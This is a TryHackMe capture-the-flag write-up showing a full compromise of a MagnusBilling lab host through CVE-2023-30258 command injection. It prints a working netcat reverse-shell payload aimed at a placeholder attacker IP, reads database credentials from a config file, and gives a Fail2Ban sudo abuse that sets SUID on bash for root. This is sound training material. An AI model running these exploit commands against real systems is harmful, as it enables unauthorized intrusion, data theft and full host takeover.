---
title: "Billing"
platform: "TryHackMe"
difficulty: "easy"
date: "2026-02-11"
status: "complete"
tags: []
---

# Billing: Write-up (TryHackMe)

**Platform:** TryHackMe  
**Room:** Billing  
**Difficulty:** Easy  
**Author:** Nelson Hirt  

---

## 1. Executive Summary

This assessment targets a Linux host running **MagnusBilling**, a VoIP billing solution based on Asterisk. The engagement demonstrates a complete compromise chain starting from a critical unauthenticated vulnerability in the web application (**CVE-2023-30258**) to privilege escalation via misconfigured administrative tools.

**Attack Chain:**
1.  **Initial Access:** Exploited an **Unauthenticated Command Injection** vulnerability in the `icepay.php` module to gain a shell as the `asterisk` user.
2.  **Privilege Escalation:** Abused `sudo` privileges on the `fail2ban-client` binary to modify the runtime configuration of the Fail2Ban server (running as root), forcing it to execute a privilege escalation payload.

---

## 2. Reconnaissance & Enumeration

### Network Scanning
A full TCP port scan was conducted to identify the service landscape.

```bash
└─$ nmap -n -Pn -T4 -p- -sV -sC <TARGET_IP>
```

**Key Findings (Raw Output Snippet):**
```text
PORT     STATE SERVICE
22/tcp   open  ssh     OpenSSH 7.4p1 Debian 10+deb9u7
80/tcp   open  http    Apache httpd 2.4.25
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.25 (Debian)
3306/tcp open  mysql   MariaDB (unauthorized)
5038/tcp open  asterisk Asterisk Call Manager 2.10.4
```

### Web Application Profiling
Initial inspection of port 80 revealed an HTTP redirection, confirming the application path.

```bash
└─$ curl -I http://<TARGET_IP>/
HTTP/1.1 301 Moved Permanently
Location: http://<TARGET_IP>/mbilling/
```

**Version Enumeration:**
By inspecting the HTML source at `/mbilling/`, references to an ExtJS `microloader` were found. The specific version was confirmed via browser console metadata:

* **Software:** MagnusBilling
* **Version:** 6.0.0.0

---

## 3. Exploitation (Initial Access)

### Vulnerability Analysis
The target version (6.0.0.0) is affected by **CVE-2023-30258**, a critical Command Injection vulnerability present in MagnusBilling versions **6.0.0 through 7.3.0**. The `democ` parameter in `icepay.php` is passed directly to an `exec()` function without sanitization.

* **Vulnerable Endpoint:** `/mbilling/lib/icepay/icepay.php`
* **Parameter:** `democ`

### Validation (Time-Based Blind RCE)
Since the application does not return command output, I validated the vulnerability using a timing differential.

**Baseline Request (Normal):**
```bash
└─$ time curl -s "http://<TARGET_IP>/mbilling/lib/icepay/icepay.php"
# Real: 0m0.132s
```

**Payload Request (Injection):**
```bash
└─$ time curl -s "http://<TARGET_IP>/mbilling/lib/icepay/icepay.php?democ=;sleep+5;"
# Real: 0m5.148s
```

**Result:** The significant delay (~5s) confirms code execution.

### Exploitation (Reverse Shell)
To obtain interactive access, I initiated a listener and injected a reverse shell payload.

**Payload:**
```bash
;rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <ATTACKER_IP> 443 >/tmp/f;
```

**Execution:**
```bash
└─$ curl -s -G "http://<TARGET_IP>/mbilling/lib/icepay/icepay.php" \
  --data-urlencode "democ=;rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <ATTACKER_IP> 443 >/tmp/f;"
```

**Access Verification:**
Upon connection, I verified the user context:
```bash
asterisk@billing:~$ id
uid=1001(asterisk) gid=1001(asterisk) groups=1001(asterisk)...
```

### Shell Stabilization
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# (Ctrl+Z)
stty raw -echo; fg
```

---

## 4. Post-Exploitation (Looting)

Before escalating privileges, I searched for sensitive configuration files to assess data impact.

**Database Credentials Discovery:**
The MagnusBilling configuration file was located at `/var/www/html/mbilling/protected/conf/main.php`.

```bash
asterisk@billing:~$ cat /var/www/html/mbilling/protected/conf/main.php | grep -i 'db'
```

**Evidence (Redacted):**
```php
'host' => 'localhost',
'username' => 'mbilling_user',
'password' => 'M@gnus[REDACTED]',
'dbname' => 'mbilling',
```
**Impact:** Validated cleartext credentials for the local MySQL database were recovered, granting potential access to Call Detail Records (CDR) and customer data.

---

## 5. Privilege Escalation (Fail2Ban Abuse)

### Enumeration
Checking for elevated privileges revealed a misconfiguration in the `sudoers` file.

```bash
asterisk@billing:~$ sudo -l
```

**Output:**
```text
User asterisk may run the following commands:
    (ALL) NOPASSWD: /usr/bin/fail2ban-client
```

### Vulnerability Mechanics
`fail2ban-client` communicates with the `fail2ban-server` socket. The server daemon runs as **root**. If a user controls the client, they can modify the **runtime configuration** (actions) and manually trigger a ban, forcing the server to execute arbitrary commands as root.

### Exploitation Steps (Proof of Concept)

**1. Identify Active Jails**
```bash
asterisk@billing:~$ sudo fail2ban-client status
```
*Target Jail Selected:* `asterisk-iptables`

**2. Verify Current Action**
I identified the action name associated with this jail.
```bash
asterisk@billing:~$ sudo fail2ban-client get asterisk-iptables actions
# Output: iptables-allports-ASTERISK
```

**3. Poison the Action (`actionban`)**
I overwrote the `actionban` command in the runtime config. Instead of banning an IP, it will now set the SUID bit on `/bin/bash`.

```bash
asterisk@billing:~$ sudo fail2ban-client set asterisk-iptables action iptables-allports-ASTERISK actionban "chmod +s /bin/bash"
```

**4. Trigger the Payload**
To force the execution, I manually banned an arbitrary IP address (e.g., 1.2.3.4).

```bash
asterisk@billing:~$ sudo fail2ban-client set asterisk-iptables banip 1.2.3.4
```
*At this moment, the Fail2Ban server executed `chmod +s /bin/bash` as root.*

**5. Verification & Root Access**
Checking the permissions of bash:
```bash
asterisk@billing:~$ ls -la /bin/bash
# Output: -rwsr-sr-x 1 root root ...
```

Escalating to root:
```bash
asterisk@billing:~$ /bin/bash -p
root@billing:~# id
# Output: euid=0(root)
```

**Status:** Full system compromise achieved. Flag retrieved from `/root/root.txt`.

---

Written by **Nelson Hirt**
